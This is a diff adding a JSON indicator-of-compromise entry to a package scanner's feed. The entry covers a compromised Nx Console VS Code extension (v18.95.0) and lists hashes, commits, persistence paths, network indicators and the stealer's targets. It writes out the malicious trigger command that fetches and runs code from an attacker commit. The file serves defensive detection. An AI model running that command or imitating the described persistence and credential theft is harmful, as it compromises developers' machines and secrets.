@@ -1,0 +1,93 @@
+{
+  "schema_version": "0.1.0",
+  "_comment": "Compromised Nx Console VS Code extension (nrwl.angular-console v18.95.0) published to the Visual Studio Code Marketplace on 2026-05-18 12:36 UTC and removed at 2026-05-18 12:47 UTC. The malicious VSIX ships an obfuscated main.js whose Efn(td) function runs on workspace activation, registers a VS Code task 'install-mcp-extension' that invokes `npx -y github:nrwl/nx#558b09d7`, and pulls a credential stealer / persistence chain (Vault, npm, AWS IMDS/ECS/Secrets Manager/SSM, GitHub tokens, SSH/GCP/Docker/Claude Code config, 1Password; macOS LaunchAgent Python backdoor at ~/Library/LaunchAgents/com.user.kitty-monitor.plist and ~/.local/share/kitty/cat.py; possible Linux sudoers injection; Sigstore/Fulcio/SLSA provenance abuse). OpenVSX was not affected. Remediated in 18.100.0+. Bumblebee matches only exact (ecosystem, name, version); behavioral/network/file IOCs below are noted for analyst context and are not consumed by the scanner. Ecosystem value is the existing 'editor-extension' family (model.EcosystemEditorExtension) emitted for VS Code, Cursor, Windsurf, and VSCodium installs; the scanner's normalized name is <publisher>.<name> lowercased, so 'nrwl.angular-console' matches both VS Code Marketplace and VSCodium-style installs on disk.",
+  "_indicators": {
+    "source": "https://www.stepsecurity.io/blog/nx-console-vs-code-extension-compromised",
+    "corroborating_source": "The Hacker News (version 18.95.0, OpenVSX unaffected, removed after 11 minutes, update to 18.100.0+, persistence artifacts)",
+    "marketplace": "Visual Studio Code Marketplace (microsoft.com/vscode marketplace); OpenVSX not affected",
+    "exposure_window_published_utc": "2026-05-18T12:36:00Z",
+    "exposure_window_removed_utc": "2026-05-18T12:47:00Z",
+    "attacker_orphan_commit_pushed_utc": "2026-05-18T03:18:00Z",
+    "malicious_orphan_commit_sha": "558b09d7ad0d1660e2a0fb8a06da81a6f42e06d2",
+    "malicious_orphan_commit_short": "558b09d7",
+    "malicious_commit_tree_sha": "ba642fe2c7c65e42dd7f6444b83023dc6827e08c",
+    "malicious_index_js_blob_sha": "acfc3f957a63b4cde93ff645f2b6bf26a8ed1bbf",
+    "malicious_package_json_blob_sha": "9d88f040c44b5f4d5f9db15ff89310776c168e99",
+    "remediated_versions": ">= 18.100.0",
+    "clean_previous_version": "18.94.0",
+    "trigger": "injected main.js function Efn(td) runs on workspace activation and launches VS Code task 'install-mcp-extension' to execute `npx -y github:nrwl/nx#558b09d7`",
+    "persistence_files": [
+      "~/.local/share/kitty/cat.py",
+      "~/Library/LaunchAgents/com.user.kitty-monitor.plist",
+      "/tmp/kitty-*",
+      "/var/tmp/.gh_update_state"
+    ],
+    "persistence_env_var": "__DAEMONIZED=1",
+    "vscode_global_state_key": "nxConsole.mcpExtensionInstalledSha",
+    "vscode_global_state_value": "558b09d7ad0d1660e2a0fb8a06da81a6f42e06d2",
+    "network_indicators": [
+      "api.github.com/search/commits?q=firedalazer",
+      "169.254.169.254",
+      "169.254.170.2",
+      "127.0.0.1:8200",
+      "fulcio.sigstore.dev",
+      "rekor.sigstore.dev",
+      "bun.sh/install",
+      "github:nrwl/nx#558b09d7"
+    ],
+    "c2_domain_caveat": "specific encrypted C2 domain was not statically recoverable",
+    "capabilities": "credential stealer targeting Vault, npm, AWS IMDS/ECS/Secrets Manager/SSM, GitHub tokens/Actions secrets, SSH/GCP/Docker/Claude Code config, 1Password; exfil via HTTPS / GitHub API / DNS tunneling; macOS LaunchAgent Python backdoor; possible Linux sudoers injection; Sigstore/Fulcio/SLSA provenance abuse"
+  },
+  "entries": [
+    {
+      "id": "stepsecurity-2026-05-18-vscode-nrwl-angular-console-compromised",
+      "name": "nrwl.angular-console (Nx Console VS Code extension 2026-05-18 compromise)",
+      "ecosystem": "editor-extension",
+      "package": "nrwl.angular-console",
+      "versions": ["18.95.0"],
+      "severity": "critical",
+      "source": "https://www.stepsecurity.io/blog/nx-console-vs-code-extension-compromised",
+      "indicators": {
+        "marketplace": "Visual Studio Code Marketplace (OpenVSX not affected)",
+        "malicious_vsix_v18_95_0_sha256": "1a4afce34918bdc74ae3f31edaffffaa0ee074d83618f53edfd88137927340b8",
+        "malicious_main_js_sha256": "b0cefb66b953e5184b6adb3035e9e267335ac5eabfe1848e07834777b9397b74",
+        "obfuscated_payload_index_js_sha256": "e7347d90653efc565f03733a95e9209d78f9cfa81e31ff2b2dd9d48d75a4b8b1",
+        "dropper_package_json_sha256": "43f2b001846c4966073ebffa5be8f15e491a1e7d32bbd805d57406ff540e0dd9",
+        "clean_vsix_v18_94_0_sha256": "228a2cf081d4cbea9b91cde14a8f9c4a4d003e7f32431496953fd6bac266f5a3",
+        "remediated_vsix_v18_100_0_sha256": "cb86f4f223daa54467c7782a0d8607e9c84e2bb633e6f0e51d9a19579e200990",
+        "malicious_orphan_commit_sha": "558b09d7ad0d1660e2a0fb8a06da81a6f42e06d2",
+        "malicious_orphan_commit_short": "558b09d7",
+        "malicious_commit_tree_sha": "ba642fe2c7c65e42dd7f6444b83023dc6827e08c",
+        "malicious_index_js_blob_sha": "acfc3f957a63b4cde93ff645f2b6bf26a8ed1bbf",
+        "malicious_package_json_blob_sha": "9d88f040c44b5f4d5f9db15ff89310776c168e99",
+        "exposure_window_published_utc": "2026-05-18T12:36:00Z",
+        "exposure_window_removed_utc": "2026-05-18T12:47:00Z",
+        "attacker_orphan_commit_pushed_utc": "2026-05-18T03:18:00Z",
+        "trigger": "main.js Efn(td) on workspace activation -> VS Code task 'install-mcp-extension' runs `npx -y github:nrwl/nx#558b09d7`",
+        "persistence_files": [
+          "~/.local/share/kitty/cat.py",
+          "~/Library/LaunchAgents/com.user.kitty-monitor.plist",
+          "/tmp/kitty-*",
+          "/var/tmp/.gh_update_state"
+        ],
+        "persistence_env_var": "__DAEMONIZED=1",
+        "vscode_global_state_key": "nxConsole.mcpExtensionInstalledSha",
+        "vscode_global_state_value": "558b09d7ad0d1660e2a0fb8a06da81a6f42e06d2",
+        "network_indicators": [
+          "api.github.com/search/commits?q=firedalazer",
+          "169.254.169.254",
+          "169.254.170.2",
+          "127.0.0.1:8200",
+          "fulcio.sigstore.dev",
+          "rekor.sigstore.dev",
+          "bun.sh/install",
+          "github:nrwl/nx#558b09d7"
+        ],
+        "c2_domain_caveat": "specific encrypted C2 domain was not statically recoverable",
+        "capabilities": "credential stealer (Vault, npm, AWS IMDS/ECS/Secrets Manager/SSM, GitHub tokens/Actions secrets, SSH/GCP/Docker/Claude Code config, 1Password); exfil via HTTPS / GitHub API / DNS tunneling; macOS LaunchAgent Python backdoor; possible Linux sudoers injection; Sigstore/Fulcio/SLSA provenance abuse",
+        "remediated_versions": ">= 18.100.0",
+        "clean_previous_version": "18.94.0"
+      }
+    }
+  ]
+}
